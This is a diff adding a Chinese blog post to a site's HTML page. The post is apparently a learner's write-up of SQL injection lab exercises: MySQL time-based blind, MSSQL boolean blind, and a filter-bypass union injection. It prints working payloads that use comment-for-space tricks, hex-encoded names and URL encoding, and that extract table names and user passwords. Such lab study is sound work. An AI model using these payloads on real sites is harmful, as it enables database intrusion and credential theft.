@@ -229,6 +229,341 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/第八节：注入实战/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zoukba">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZouKba">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/04/第八节：注入实战/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-04T22:29:52+08:00">
+                2018-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="第八节：注入实战"><a href="#第八节：注入实战" class="headerlink" title="第八节：注入实战"></a>第八节：注入实战</h1><h2 id="mysql时间盲注"><a href="#mysql时间盲注" class="headerlink" title="mysql时间盲注"></a>mysql时间盲注</h2><ul>
+<li><p>判断URL是否为注入点</p>
+<ul>
+<li><p>注入URL:<a href="http://219.153.49.228:48363/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:48363/new_list.php?id=1</a></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-f33ae8643c697eca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s1.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-02f8d41ed45ccc4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s2.png"></p>
+</li>
+<li><p>存在注入且注入类型可能是数字型</p>
+</li>
+</ul>
+</li>
+<li><p>确定数据库类型</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-7feba296ac62fba0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s3.png"></p>
+<ul>
+<li>是一个mysql数据库</li>
+</ul>
+</li>
+<li><p>确定字段</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-3c252b0c6e9d58ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s4.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-e2a38dd801774f13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s5.png"></p>
+<ul>
+<li>经过判断有5个数据字段</li>
+</ul>
+</li>
+<li><p>证明方式</p>
+<ul>
+<li>采用时间盲注</li>
+</ul>
+</li>
+<li><p>获取数据库名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-8cdf1247924ca73d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s6.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-e6500d515d57262f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s7.png"></p>
+<ul>
+<li><p>查看有多少字符,22个</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-2d41ad974b7bc0f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s8.png"></p>
+</li>
+<li><p>一个一个遍历，第一个字母是‘m’</p>
+</li>
+<li><p>得到数据库名名mozhe_Discuz_StormGroup</p>
+</li>
+</ul>
+</li>
+<li><p>获取表名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-7e957fc0b927e99c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s9.png"></p>
+<ul>
+<li><p>表的长度为17</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-bfd4ea24bac4055d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s10.png"></p>
+</li>
+<li><p>遍历表，第一个字母为S</p>
+</li>
+<li><p>得到表名StormGroup_member</p>
+</li>
+</ul>
+</li>
+<li><p>获取列名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-9dfcaaa0e9ca8dfd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s11.png"></p>
+<ul>
+<li>得到字段为id，name，passwd</li>
+</ul>
+</li>
+<li><p>获取信息</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-8bddd2d3ccadce04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="s12.png"></p>
+</li>
+<li><p>小结</p>
+<ul>
+<li><p>在mysql中时间延迟是这样利用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(...,sleep(xx),1)            //如果为真延迟5秒返回正常页面</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>合理运用ascii(),substr()函数</p>
+</li>
+<li><p>个人感觉在盲注里字段的判断都是可以省略的，注入怎么快怎么来</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="mssql逻辑盲注"><a href="#mssql逻辑盲注" class="headerlink" title="mssql逻辑盲注"></a>mssql逻辑盲注</h2><ul>
+<li><p>判断URL是否存在注入</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-0abb3753dca4be87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l1.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-48ac035673258f32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l2.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-a5b4bcfc02b88003.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l3.png"></p>
+<ul>
+<li>可能是个数字型</li>
+</ul>
+</li>
+<li><p>判断数据库类型</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-7d76c4d83d6a981b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l4.png"></p>
+<ul>
+<li><p>是一个sql servers数据库</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-b8a79a0d43ab0f98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l5.png"></p>
+</li>
+<li><p>探测其版本号，2005版本</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-4794733cbc50aa3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l6.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-e4085414584001e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l7.png"></p>
+</li>
+<li><p>可能是sql servers 2005 rtm</p>
+</li>
+</ul>
+</li>
+<li><p>证明方式</p>
+<ul>
+<li>逻辑盲注，使用burpsuit</li>
+</ul>
+</li>
+<li><p>获取数据库名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-87a528eb5e695085.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l8.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-630abce8caee106c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l9.png"></p>
+<ul>
+<li><p>长度为11</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-c230a37f6c9916b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l10.png"></p>
+</li>
+<li><p>名称为mozhe_db_v2</p>
+</li>
+</ul>
+</li>
+<li><p>获取表名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-5549f5d5feaeafb8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l12.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-41fe14b6dfab3f33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l13.png"></p>
+<ul>
+<li>表名为manage</li>
+</ul>
+</li>
+<li><p>获取列名称</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-0cacbcc575ec7a56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l14.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-2d3b9d78ec857956.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="l15.png"></p>
+<ul>
+<li>得到id,username,password</li>
+</ul>
+</li>
+<li><p>获取信息</p>
+<ul>
+<li>分别获取<br>username以及password的值</li>
+</ul>
+</li>
+<li><p>小结</p>
+<ul>
+<li><p>需要合理利用语句的逻辑性来进行注入</p>
+<p>本次用的是2/1，2/0，真的时候正常输出，假的时候就会报错</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="sql过滤字符注入"><a href="#sql过滤字符注入" class="headerlink" title="sql过滤字符注入"></a>sql过滤字符注入</h2><ul>
+<li><p>确定URL是否存在注入</p>
+<ul>
+<li><p>各种尝试，发现无论输出什么都会回到id=1</p>
+<p>参考群内大佬的文章</p>
+<p>知道空格，=号被过滤</p>
+<p>字符需要16进制编码，整体需要URL编码</p>
+<p>空格需要/**/代替</p>
+</li>
+<li><p>采用(-1)(-0)</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-52c71296c005992a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r1.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-c24d5007af06e4d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r2.png"></p>
+</li>
+<li><p>确定存在，可能是数字型</p>
+</li>
+</ul>
+</li>
+<li><p>确定数据库类型</p>
+<ul>
+<li>尝试了多次select count(*) from information_schema.tables没有出来，那就由题可知他是一个mysql</li>
+</ul>
+</li>
+<li><p>判断字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/order/**/by/**/4/**/--   </span><br><span class="line">%2F%2A%2A%2F%6F%72%64%65%72%2F%2A%2A%2F%62%79%2F%2A%2A%2F%34%2F%2A%2A%2F%2D%2D</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-ddc1b339906a3af4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r3.png"></p>
+<ul>
+<li>有四个字段</li>
+</ul>
+</li>
+<li><p>字段回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/union/**/select/**/1,2,3,4/**/--</span><br><span class="line">%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%31%2C%32%2C%33%2C%34%2F%2A%2A%2F%2D%2D</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-06a276be80a2237c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r4.png"></p>
+<ul>
+<li>在 2，3位值回显</li>
+</ul>
+</li>
+<li><p>获取数据库名称和版本号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/union/**/select/**/1,database(),@@version,4/**/--</span><br><span class="line">%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%31%2C%64%61%74%61%62%61%73%65%28%29%2C%40%40%76%65%72%73%69%6F%6E%2C%34%2F%2A%2A%2F%2D%2D</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-ea9339ddcc0b837c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r5.png"></p>
+<ul>
+<li>这里我们发现了他的版本号，而且数据库的名称为mozhe_discuz_stormgroup</li>
+</ul>
+</li>
+<li><p>获取表名</p>
+<ul>
+<li><p>mozhe_discuz_stormgroup 16进制加密</p>
+<p>0x6D6F7A68655F64697363757A5F73746F726D67726F7570</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/0x6D6F7A68655F64697363757A5F73746F726D67726F7570),@@version,4/**/--</span><br><span class="line">%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%31%2C%28%73%65%6C%65%63%74%2F%2A%2A%2F%67%72%6F%75%70%5F%63%6F%6E%63%61%74%28%74%61%62%6C%65%5F%6E%61%6D%65%29%2F%2A%2A%2F%66%72%6F%6D%2F%2A%2A%2F%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%2F%2A%2A%2F%77%68%65%72%65%2F%2A%2A%2F%74%61%62%6C%65%5F%73%63%68%65%6D%61%2F%2A%2A%2F%6C%69%6B%65%2F%2A%2A%2F%30%78%36%44%36%46%37%41%36%38%36%35%35%46%36%34%36%39%37%33%36%33%37%35%37%41%35%46%37%33%37%34%36%46%37%32%36%44%36%37%37%32%36%46%37%35%37%30%29%2C%40%40%76%65%72%73%69%6F%6E%2C%34%2F%2A%2A%2F%2D%2D</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-90f0674736a3fbcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r6.png"></p>
+</li>
+<li><p>得到表名notice，stormgroup_member</p>
+</li>
+</ul>
+</li>
+<li><p>获取列名</p>
+<ul>
+<li><p>stormgroup_member 16进制</p>
+<p>0x73746F726D67726F75705F6D656D626572</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/0x6D6F7A68655F64697363757A5F73746F726D67726F7570),(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/0x6D6F7A68655F64697363757A5F73746F726D67726F7570/**/and/**/table_name/**/like/**/0x73746F726D67726F75705F6D656D626572),4/**/--</span><br><span class="line">%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%31%2C%28%73%65%6C%65%63%74%2F%2A%2A%2F%67%72%6F%75%70%5F%63%6F%6E%63%61%74%28%74%61%62%6C%65%5F%6E%61%6D%65%29%2F%2A%2A%2F%66%72%6F%6D%2F%2A%2A%2F%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%2F%2A%2A%2F%77%68%65%72%65%2F%2A%2A%2F%74%61%62%6C%65%5F%73%63%68%65%6D%61%2F%2A%2A%2F%6C%69%6B%65%2F%2A%2A%2F%30%78%36%44%36%46%37%41%36%38%36%35%35%46%36%34%36%39%37%33%36%33%37%35%37%41%35%46%37%33%37%34%36%46%37%32%36%44%36%37%37%32%36%46%37%35%37%30%29%2C%28%73%65%6C%65%63%74%2F%2A%2A%2F%67%72%6F%75%70%5F%63%6F%6E%63%61%74%28%63%6F%6C%75%6D%6E%5F%6E%61%6D%65%29%2F%2A%2A%2F%66%72%6F%6D%2F%2A%2A%2F%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%63%6F%6C%75%6D%6E%73%2F%2A%2A%2F%77%68%65%72%65%2F%2A%2A%2F%74%61%62%6C%65%5F%73%63%68%65%6D%61%2F%2A%2A%2F%6C%69%6B%65%2F%2A%2A%2F%30%78%36%44%36%46%37%41%36%38%36%35%35%46%36%34%36%39%37%33%36%33%37%35%37%41%35%46%37%33%37%34%36%46%37%32%36%44%36%37%37%32%36%46%37%35%37%30%2F%2A%2A%2F%61%6E%64%2F%2A%2A%2F%74%61%62%6C%65%5F%6E%61%6D%65%2F%2A%2A%2F%6C%69%6B%65%2F%2A%2A%2F%30%78%37%33%37%34%36%46%37%32%36%44%36%37%37%32%36%46%37%35%37%30%35%46%36%44%36%35%36%44%36%32%36%35%37%32%29%2C%34%2F%2A%2A%2F%2D%2D</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-a6c576527fbca441.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r7.png"></p>
+</li>
+<li><p>得到字段id，name,password,status</p>
+</li>
+</ul>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/union/**/select/**/1,(concat_ws(&apos;#&apos;,name,password)),3,4/**/from/**/stormgroup_member/**/limit/**/0,1</span><br><span class="line">%65%2C%70%61%73%73%77%6F%72%64%29%29%2C%33%2C%34%2F%2A%2A%2F%66%72%6F%6D%2F%2A%2A%2F%73%74%6F%72%6D%67%72%6F%75%70%5F%6D%65%6D%62%65%72%2F%2A%2A%2F%6C%69%6D%69%74%2F%2A%2A%2F%30%2C%31</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-f15224398c97497a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="r8.png"></p>
+</li>
+</ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
+<li><p><strong>I love waking up in the morning, not knowing what’s going to happen, or whom I’m going to meet, where I’m going to wind up.</strong></p>
+<p>我喜欢早上起来时一切都是未知的，不知会遇见什么人，会有什么样的结局。</p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/第七节：学习mssql/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1733,7 +2068,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
